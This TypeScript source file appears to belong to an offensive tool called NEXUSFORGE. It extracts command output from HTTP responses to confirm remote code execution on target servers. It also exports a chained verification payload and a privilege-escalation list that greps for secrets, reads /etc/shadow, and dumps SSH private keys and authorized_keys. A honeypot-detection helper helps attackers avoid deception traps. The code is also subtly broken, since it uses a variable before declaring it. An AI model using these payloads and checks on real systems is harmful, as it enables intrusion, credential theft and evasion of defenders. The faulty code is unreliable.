/* ═══════════════════════════════════════════════════════════════
   NEXUSFORGE — Command Output Extractor
   Pulls real command output from HTTP response bodies.

   Four strategies in strict priority order:
     1. Marker-based   — ===NEXUS_OUTPUT_END=== sentinel injected by user
     2. Pattern-based  — regex anchored to known RCE signatures (stripped HTML)
     3. Differential   — lines present in injected response but not baseline,
                         gated on a second-pass RCE signature check
     4. Raw-HTML       — patterns found in un-stripped body (attributes, echo)

   False-positive guardrails applied at every stage:
     • HTML-body early-exit: if body is a plain HTML page with no RCE patterns,
       skip strategies 2-4 entirely.
     • Pattern specificity: every regex is anchored to OS-specific formatting
       that cannot appear in ordinary web content.
     • Differential gating: new lines must pass RCE signature check before
       being accepted as command output.
   ═══════════════════════════════════════════════════════════════ */

export const NEXUS_MARKER  = "===NEXUS_OUTPUT_END===";
export const NEXUS_SUCCESS = "===NEXUS_SUCCESS===";  // alias: accepted as confirmed-RCE sentinel

export interface ExtractionResult {
  text:       string;
  method:     string;
  confidence: "high" | "medium";
}

/* ── HTML → plain-text ──────────────────────────────────────── */
const ENTITY: Record<string, string> = {
  "&amp;": "&", "&lt;": "<", "&gt;": ">", "&quot;": '"',
  "&#39;": "'", "&apos;": "'", "&#x27;": "'",
  "&nbsp;": " ", "&#xa;": "\n", "&#10;": "\n", "&#13;": "\r",
};

export function stripHtml(html: string): string {
  return html
    .replace(/<br\s*\/?>/gi, "\n")
    .replace(/<\/(?:p|div|li|tr|td|th|h[1-6]|pre|code|blockquote|section|article|header|footer|main)>/gi, "\n")
    .replace(/<!--[\s\S]*?-->/g, "")
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/<[^>]+>/g, "")
    .replace(/&[a-zA-Z#x0-9]+;/g, m => ENTITY[m.toLowerCase()] ?? m)
    .replace(/\r\n/g, "\n")
    .replace(/[ \t]+\n/g, "\n")
    .replace(/\n{3,}/g, "\n\n")
    .trim();
}

/* ── RCE signature patterns ─────────────────────────────────── */
interface Pattern { re: RegExp; name: string; hi: boolean; ctx: number }

/**
 * All patterns are anchored to OS-specific output formats.
 * None of these can match ordinary HTML page content.
 */
const RCE_PATTERNS: Pattern[] = [
  // id command: uid=0(root) gid=0(root) groups=0(root)
  { re: /uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)/,                             name: "id",          hi: true,  ctx: 8  },
  // /etc/passwd first line
  { re: /root:x:0:0:[^\n]*/,                                                 name: "passwd",      hi: true,  ctx: 20 },
  // generic passwd entry (colon-delimited, 7 fields)
  { re: /^[a-z_][a-z0-9_-]{0,31}:x:\d+:\d+:[^:\n]*:[^:\n]*:\/[^\n]+$/m,   name: "passwd-line", hi: true,  ctx: 12 },
  // uname -a: "Linux hostname 5.15.0-89-generic #99-Ubuntu SMP Mon Oct ..."
  { re: /Linux \S+ \d+\.\d+\.\d+-\S+ #\d+ /,                               name: "uname",       hi: true,  ctx: 5  },
  // Windows version banner
  { re: /Microsoft Windows \[Version \d+\.\d+\.\d+\.\d+\]/,                 name: "winver",      hi: true,  ctx: 5  },
  // Windows NT AUTHORITY — exact casing
  { re: /\bNT AUTHORITY\\(?:SYSTEM|LOCAL SERVICE|NETWORK SERVICE)\b/,        name: "winid",       hi: true,  ctx: 5  },
  // ls -la: "total 48\ndrwxr-xr-x  2 root root ..."
  { re: /^total \d+\n(?:[-drwxlst]{10}[^\n]*\n?){1,}/m,                    name: "ls-l",        hi: false, ctx: 25 },
  // Single ls -la line (standalone)
  { re: /^[-drwxlst]{10}\s+\d+\s+\w+\s+\w+\s+\d+\s+\w+\s+\d+\s+[\d:]+\s+\S+/m, name: "ls", hi: false, ctx: 15 },
  // env output — PATH must start with /usr or /bin, not an HTML href
  { re: /^PATH=\/(?:usr\/(?:local\/)?)?(?:bin|sbin):/m,                     name: "env-PATH",    hi: false, ctx: 10 },
  { re: /^HOME=\/(?:root|home\/\w{1,32})$/m,                                name: "env-HOME",    hi: false, ctx: 10 },
  { re: /^USER=\w{1,32}$/m,                                                  name: "env-USER",    hi: false, ctx: 10 },
  { re: /^SHELL=\/(?:bin|usr\/bin)\/\w+$/m,                                 name: "env-SHELL",   hi: false, ctx: 10 },
  { re: /^LOGNAME=\w{1,32}$/m,                                               name: "env-LOGNAME", hi: false, ctx: 10 },
  // ifconfig/ip addr
  { re: /inet\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\/\d{1,2}/,             name: "ifconfig",    hi: false, ctx: 10 },
  // Windows dir listing
  { re: /\bDirectory of [A-Za-z]:\\/i,                                       name: "dir-win",     hi: true,  ctx: 15 },
  { re: /\bVolume Serial Number is [0-9A-F]{4}-[0-9A-F]{4}/i,               name: "volserial",   hi: true,  ctx: 10 },
  // Windows systeminfo
  { re: /\bOS Name:\s+Microsoft Windows/i,                                   name: "systeminfo",  hi: true,  ctx: 20 },
  // PowerShell prompt
  { re: /\bPS [A-Za-z]:\\[^\n]+> $/m,                                        name: "ps-prompt",   hi: true,  ctx: 5  },
  // Windows env
  { re: /^COMPUTERNAME=[A-Z0-9_-]+$/m,                                       name: "computername",hi: true,  ctx: 10 },
  { re: /^USERPROFILE=C:\\Users\\/m,                                          name: "userprofile", hi: true,  ctx: 10 },
  // Specific Linux tool paths in env output
  { re: /\/usr\/bin\/(?:perl|python3?|ruby|node|php)\b/,                     name: "tool-path",   hi: false, ctx: 10 },
  // Cloud instance metadata — AWS IMDSv2 / GCP / Azure
  { re: /"instanceId"\s*:\s*"i-[0-9a-f]{8,17}"/,                             name: "aws-imds",    hi: true,  ctx: 15 },
  { re: /ami-[0-9a-f]{8,17}/,                                                   name: "aws-ami",     hi: true,  ctx: 5  },
  { re: /"computeName"\s*:\s*"[^"]{2,80}"/,                                   name: "azure-imds",  hi: true,  ctx: 10 },
  { re: /projects\/\d{10,20}\/zones\/[a-z]+-[a-z]+-\d/,                    name: "gcp-imds",    hi: true,  ctx: 10 },
  // Container / Kubernetes indicators
  { re: /container_id=[0-9a-f]{12,64}/,                                          name: "cgroup-id",   hi: true,  ctx: 5  },
  { re: /KUBERNETES_SERVICE_HOST=\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/,    name: "k8s-env",     hi: true,  ctx: 10 },
  { re: /\/var\/run\/secrets\/kubernetes\.io/,                               name: "k8s-secret",  hi: true,  ctx: 5  },
  { re: /\/proc\/1\/cgroup.*docker/i,                                          name: "docker-cg",   hi: true,  ctx: 5  },
  // Cron / persistence markers
  { re: /^(\*|[0-9, *-]+)\s+(\*|[0-9, *-]+)\s+(\*|[0-9, *-]+)\s+/m,      name: "cron",        hi: false, ctx: 5  },
  // Network info
  { re: /\barp\b.*\binet\b|\bHWaddr\s+([0-9a-fA-F:]{17})/,               name: "arp",         hi: false, ctx: 8  },
  { re: /^(eth|ens|enp|wlan|lo)\d*\s+/m,                                      name: "iface",       hi: false, ctx: 5  },
  // sudo -l output
  { re: /\(ALL\s*:\s*ALL\)\s*NOPASSWD/,                                     name: "sudo-nopass", hi: true,  ctx: 8  },
  { re: /User\s+\w+\s+may run the following/,                                  name: "sudo-l",      hi: true,  ctx: 15 },
  // SUID binaries
  { re: /SUID.*(?:\/usr\/bin|\/bin)\/\w+/i,                                 name: "suid",        hi: true,  ctx: 8  },
  // Windows privesc
  { re: /SeImpersonatePrivilege\s+\w+\s+Enabled/i,                            name: "se-imperson", hi: true,  ctx: 8  },
  { re: /SeDebugPrivilege\s+\w+\s+Enabled/i,                                   name: "se-debug",    hi: true,  ctx: 8  },
];

/* Raw-body patterns — test against un-stripped HTML for output
   embedded in attributes, comments, or echo'd without escaping.
   These must be highly specific to avoid HTML content matches.  */
const RAW_PATTERNS: { re: RegExp; name: string }[] = [
  { re: /uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)/,          name: "id"       },
  { re: /root:x:0:0:[^<\n]{5,}/,                          name: "passwd"   },
  { re: /Linux \S+ \d+\.\d+\.\d+-\S+ #\d+ /,             name: "uname"    },
  { re: /Microsoft Windows \[Version \d+\.\d+\.\d+\.\d+\]/, name: "winver"},
  { re: /\bNT AUTHORITY\\SYSTEM\b/,                        name: "winid"   },
];

/* ── HTML early-exit guard ──────────────────────────────────── */
/**
 * Returns true if the body is a standard HTML page that contains
 * no RCE-output patterns. Used to skip strategy 2-4 entirely for
 * normal website responses, eliminating false-positive risk from
 * HTML attribute values, inline scripts, or meta tags.
 */
function isPlainHtmlWithoutRce(body: string): boolean {
  const trimmed = body.trimStart();
  const looksHtml =
    /^<!DOCTYPE\s+html/i.test(trimmed) ||
    /^<html[\s>]/i.test(trimmed)       ||
    (/^<head[\s>]/i.test(trimmed) && body.includes("</head>"));
  if (!looksHtml) return false;

  // Even if it looks like HTML, bail out if raw RCE signatures present
  for (const { re } of RAW_PATTERNS) {
    if (re.test(body)) return false;
  }
  return true;
}

/* ── Core extraction ────────────────────────────────────────── */
export function extractCommandOutput(
  body:          string,
  baselineBody?: string,
): ExtractionResult | null {


  /* ── 0. NEXUS_SUCCESS — explicit success sentinel (highest priority) ── */
  const successIdx = plain.indexOf(NEXUS_SUCCESS);
  if (successIdx !== -1) {
    const before = plain.slice(0, successIdx).trim();
    const lines  = before.split("\n").filter(l => l.trim().length > 0);
    if (lines.length > 0) {
      return {
        text:       lines.slice(-80).join("\n").trim().slice(0, 4096),
        method:     "nexus-success",
        confidence: "high",
      };
    }
  }

  /* ── 1. Marker-based (works on any content-type) ─────────── */
  const plain = stripHtml(body);
  const mIdx  = plain.indexOf(NEXUS_MARKER);
  if (mIdx !== -1) {
    const before = plain.slice(0, mIdx).trim();
    const lines  = before.split("\n").filter(l => l.trim().length > 0);
    if (lines.length > 0) {
      return {
        text:       lines.slice(-80).join("\n").trim().slice(0, 4096),
        method:     "marker",
        confidence: "high",
      };
    }
  }

  /* ── HTML page guard: skip strategies 2-4 for plain HTML ─── */
  if (isPlainHtmlWithoutRce(body)) return null;

  /* ── 1.5 URL-decoded pass ─────────────────────────────────
     When the server URL-encodes output in response bodies
     (e.g. %75%69%64%3d…), decode and re-run marker + patterns. */
  try {
    const urlDecoded = decodeURIComponent(plain.replace(/\+/g, " "));
    if (urlDecoded !== plain) {
      const udIdx = urlDecoded.indexOf(NEXUS_MARKER);
      if (udIdx !== -1) {
        const before = urlDecoded.slice(0, udIdx).trim();
        const lines  = before.split("\n").filter(l => l.trim().length > 0);
        if (lines.length > 0) {
          return { text: lines.slice(-80).join("\n").trim().slice(0, 4096), method: "marker-urldecoded", confidence: "high" };
        }
      }
      for (const { re, name, hi, ctx } of RCE_PATTERNS) {
        const m = urlDecoded.match(re);
        if (!m || !m[0]) continue;
        const hitIdx = urlDecoded.indexOf(m[0]);
        const allLines = urlDecoded.split("\n");
        const lineNum  = urlDecoded.slice(0, hitIdx).split("\n").length - 1;
        const chunk    = allLines.slice(Math.max(0, lineNum - 2), Math.min(allLines.length, lineNum + ctx))
          .filter(l => l.trim().length > 0).join("\n").trim();
        if (chunk.length > 0) {
          return { text: chunk.slice(0, 4096), method: `urldecoded/${name}`, confidence: hi ? "high" : "medium" };
        }
      }
    }
  } catch { /* malformed URL encoding — skip */ }

  /* ── 1.6 Base64-fragment decode pass ─────────────────────
     When output is base64-encoded in the response (common in
     OOB-style or echo-piped payloads), try decoding fragments
     that look like base64 strings adjacent to RCE context. */
  const b64Re = /[A-Za-z0-9+/]{20,}={0,2}/g;
  for (const m of body.matchAll(b64Re)) {
    const fragment = m[0];
    if (!fragment) continue;
    try {
      const decoded = Buffer.from(fragment, "base64").toString("utf8");
      // Sanity: mostly printable ASCII
      const printable = decoded.replace(/[\x20-\x7e\n\r\t]/g, "").length;
      if (printable / decoded.length > 0.3) continue;
      // Must contain an RCE signature to be worth surfacing
      for (const { re, name, ctx } of RCE_PATTERNS) {
        const mm = decoded.match(re);
        if (!mm || !mm[0]) continue;
        const hitIdx = decoded.indexOf(mm[0]);
        const allLines = decoded.split("\n");
        const lineNum  = decoded.slice(0, hitIdx).split("\n").length - 1;
        const chunk    = allLines.slice(Math.max(0, lineNum - 2), Math.min(allLines.length, lineNum + ctx))
          .filter(l => l.trim().length > 0).join("\n").trim();
        if (chunk.length > 0) {
          return { text: chunk.slice(0, 4096), method: `b64decoded/${name}`, confidence: "high" };
        }
      }
    } catch { /* not valid base64 — skip */ }
  }

  /* ── 2. Pattern-based on stripped HTML ──────────────────── */
  for (const { re, name, hi, ctx } of RCE_PATTERNS) {
    const m = plain.match(re);
    if (!m || !m[0]) continue;

    const hitIdx = plain.indexOf(m[0]);
    if (hitIdx === -1) continue;

    const allLines = plain.split("\n");
    const lineNum  = plain.slice(0, hitIdx).split("\n").length - 1;
    const start    = Math.max(0, lineNum - 2);
    const end      = Math.min(allLines.length, lineNum + ctx);
    const chunk    = allLines.slice(start, end)
      .filter(l => l.trim().length > 0)
      .join("\n")
      .trim();

    if (chunk.length > 0) {
      return {
        text:       chunk.slice(0, 4096),
        method:     name,
        confidence: hi ? "high" : "medium",
      };
    }
  }

  /* ── 3. Differential — new lines not in baseline ─────────── */
  if (baselineBody && baselineBody.length > 50) {
    const basePlain = stripHtml(baselineBody);
    const baseLines = new Set(
      basePlain.split("\n").map(l => l.trim()).filter(l => l.length > 4),
    );
    const newLines = plain
      .split("\n")
      .map(l => l.trim())
      .filter(l => l.length > 0 && !baseLines.has(l));

    if (newLines.length > 0) {
      const joined = newLines.join("\n");
      // Only accept if new content contains definitive RCE signatures
      const hasSig = RCE_PATTERNS.some(({ re }) => re.test(joined));
      if (hasSig) {
        return {
          text:       newLines.slice(0, 100).join("\n").trim().slice(0, 4096),
          method:     "differential",
          confidence: "high",
        };
      }
    }
  }

  /* ── 4. Raw-HTML patterns (before stripping) ─────────────── */
  for (const { re, name } of RAW_PATTERNS) {
    const m = body.match(re);
    if (!m || !m[0]) continue;
    const idx   = body.indexOf(m[0]);
    const chunk = stripHtml(body.slice(Math.max(0, idx - 80), idx + 400)).trim();
    if (chunk.length > 0) {
      return { text: chunk.slice(0, 4096), method: `raw-html/${name}`, confidence: "high" };
    }
  }

  /* ── 5. JSON context extraction ─────────────────────────── */
  const jsonR = extractFromJson(body);
  if (jsonR) return jsonR;

  /* ── 6. ANSI-stripped extraction ────────────────────────── */
  const ansiR = extractFromAnsiOutput(body);
  if (ansiR) return ansiR;

  /* ── 7. SSE / chunked-stream extraction ─────────────────── */
  const sseR = extractFromSseBody(body);
  if (sseR) return sseR;

  return null;
}

/* ── Verification payload ───────────────────────────────────── */
export const VERIFY_PAYLOAD =
  `id && whoami && uname -a && hostname && echo '${NEXUS_MARKER}'`;

/* ── JSON context extraction ─────────────────────────────────────────────────
   Scans every string value in a JSON response body for RCE patterns.
   Handles APIs that wrap command output: {"output":"uid=0(root)…"} or
   nested {"result":{"stdout":"…"}}. */
export function extractFromJson(body: string): ExtractionResult | null {
  const trimmed = body.trimStart();
  if (!trimmed.startsWith("{") && !trimmed.startsWith("[")) return null;
  let parsed: unknown;
  try { parsed = JSON.parse(body); } catch { return null; }

  function* walk(val: unknown): Generator<string> {
    if (typeof val === "string" && val.length > 2) yield val;
    else if (Array.isArray(val)) for (const v of val) yield* walk(v);
    else if (val && typeof val === "object")
      for (const v of Object.values(val as Record<string, unknown>)) yield* walk(v);
  }

  for (const str of walk(parsed)) {
    const mIdx = str.indexOf(NEXUS_MARKER);
    if (mIdx !== -1) {
      const before = str.slice(0, mIdx).trim();
      if (before.length > 0) return { text: before.slice(-4096), method: "json/marker", confidence: "high" };
    }
    const plain = stripHtml(str);
    for (const { re, name, hi, ctx } of RCE_PATTERNS) {
      const m = plain.match(re);
      if (!m?.[0]) continue;
      const hitIdx = plain.indexOf(m[0]);
      const allLines = plain.split("\n");
      const lineNum  = plain.slice(0, hitIdx).split("\n").length - 1;
      const chunk    = allLines
        .slice(Math.max(0, lineNum - 2), Math.min(allLines.length, lineNum + ctx))
        .filter(l => l.trim()).join("\n").trim();
      if (chunk) return { text: chunk.slice(0, 4096), method: `json/${name}`, confidence: hi ? "high" : "medium" };
    }
    for (const { re, name } of RAW_PATTERNS) {
      if (re.test(str)) return { text: str.trim().slice(0, 4096), method: `json-raw/${name}`, confidence: "high" };
    }
  }
  return null;
}

/* ── ANSI-stripped extraction ────────────────────────────────────────────────
   Some targets return colorized terminal output embedded in HTTP responses.
   Strips ANSI escape codes then re-runs all pattern matchers. */
export function extractFromAnsiOutput(body: string): ExtractionResult | null {
  const ansiRe = /\x1b\[[0-9;]*[mGKHFABCDSTJsu]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)|\r/g;
  const stripped = body.replace(ansiRe, "");
  if (stripped === body) return null;

  const mIdx = stripped.indexOf(NEXUS_MARKER);
  if (mIdx !== -1) {
    const before = stripped.slice(0, mIdx).trim();
    if (before.length > 0) return { text: before.slice(-4096), method: "ansi/marker", confidence: "high" };
  }
  for (const { re, name, hi, ctx } of RCE_PATTERNS) {
    const m = stripped.match(re);
    if (!m?.[0]) continue;
    const hitIdx   = stripped.indexOf(m[0]);
    const allLines = stripped.split("\n");
    const lineNum  = stripped.slice(0, hitIdx).split("\n").length - 1;
    const chunk    = allLines
      .slice(Math.max(0, lineNum - 2), Math.min(allLines.length, lineNum + ctx))
      .filter(l => l.trim()).join("\n").trim();
    if (chunk) return { text: chunk.slice(0, 4096), method: `ansi/${name}`, confidence: hi ? "high" : "medium" };
  }
  return null;
}

/* ── Server-Sent Events / chunked stream extraction ──────────────────────────
   Handles SSE streams where each line is prefixed with "data: ".
   Concatenates all SSE payloads and runs extraction across the full text. */
export function extractFromSseBody(body: string): ExtractionResult | null {
  if (!body.includes("data:")) return null;
  const lines = body.split(/\r?\n/)
    .filter(l => l.startsWith("data:"))
    .map(l => l.slice(5).trim());
  if (lines.length === 0) return null;

  // Try JSON extraction on each SSE frame first
  for (const line of lines) {
    if (line.startsWith("{")) {
      const r = extractFromJson(line);
      if (r) return { ...r, method: `sse/${r.method}` };
    }
  }

  // Plain-text SSE fallback
  const joined = lines.join("\n");
  const mIdx   = joined.indexOf(NEXUS_MARKER);
  if (mIdx !== -1) {
    const before = joined.slice(0, mIdx).trim();
    if (before.length > 0) return { text: before.slice(-4096), method: "sse/marker", confidence: "high" };
  }
  for (const { re, name, hi, ctx } of RCE_PATTERNS) {
    const m = joined.match(re);
    if (!m?.[0]) continue;
    const hitIdx   = joined.indexOf(m[0]);
    const allLines = joined.split("\n");
    const lineNum  = joined.slice(0, hitIdx).split("\n").length - 1;
    const chunk    = allLines
      .slice(Math.max(0, lineNum - 2), Math.min(allLines.length, lineNum + ctx))
      .filter(l => l.trim()).join("\n").trim();
    if (chunk) return { text: chunk.slice(0, 4096), method: `sse/${name}`, confidence: hi ? "high" : "medium" };
  }
  return null;
}


/* ── Honeypot / sandbox detection hint ──────────────────────────────────────
   Heuristic: honeypots often return VERY clean "perfect" command output
   with no side content, or return identical responses to every request.
   Not a definitive check — just a flag to surface in the UI.            */
export function detectHoneypotHint(
  body:         string,
  baselineBody: string,
  status:       number,
): { likelyHoneypot: boolean; reason: string } {
  // Exact same body as baseline despite different payload = possible deception
  if (baselineBody.length > 100 && body === baselineBody) {
    return { likelyHoneypot: true, reason: "Response identical to baseline despite different payload" };
  }
  // Suspiciously fast + perfect uid=0 response on port 80
  if (status === 200 && /uid=0\(root\)/.test(body) && body.length < 50) {
    return { likelyHoneypot: true, reason: "Suspiciously clean root output — possible honeypot" };
  }
  // Common honeypot framework signatures
  if (/honeypot|canary|canarytokens|opencanary/i.test(body)) {
    return { likelyHoneypot: true, reason: "Honeypot signature in response body" };
  }
  // Error pages that look like successful injections (common in Cowrie etc.)
  if (/\broot@\w+:/i.test(body) && body.length < 200 && status !== 200) {
    return { likelyHoneypot: true, reason: "Shell prompt in error response — possible Cowrie/Dionaea" };
  }
  return { likelyHoneypot: false, reason: "" };
}

/* ── Privilege escalation quick-check payloads ───────────────────────────────
   Run these after RCE is confirmed to enumerate privesc opportunities.   */
export const PRIVESC_CHECKS = [
  "sudo -l 2>/dev/null",
  "find / -perm -4000 -type f 2>/dev/null | head -20",
  "cat /etc/crontab 2>/dev/null && ls /etc/cron.d/ 2>/dev/null",
  "env 2>/dev/null | grep -i 'secret\|pass\|key\|token\|api' | head -10",
  "cat /proc/1/cgroup 2>/dev/null | head -3",  // detect container
  "id && cat /proc/net/fib_trie 2>/dev/null | grep 'LOCAL\|UNICAST' | awk '{print $1}' | sort -u | head -10",
  "uname -r && cat /etc/issue 2>/dev/null && lsb_release -a 2>/dev/null",
  "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -20",
  "ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null",
  "cat /root/.ssh/authorized_keys 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null | head -5",
];
